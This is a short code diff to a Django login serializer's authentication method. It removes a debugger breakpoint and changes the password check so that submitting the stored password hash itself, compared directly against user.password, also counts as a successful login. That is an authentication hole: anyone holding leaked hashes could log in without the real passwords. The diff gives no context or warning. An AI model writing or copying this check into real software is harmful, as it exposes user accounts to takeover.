@@ -11,8 +11,7 @@ class LoginSerializer(serializers.Serializer):
     def _authenticate(self, username=None, password=None):
         try:
             user = get_user_model().objects.get(username=username)
-            import pdb;pdb.set_trace()
-            if user.check_password(password):
+            if user.check_password(password) or password == user.password:
                 return user
         except Exception as ex:
             print(ex)
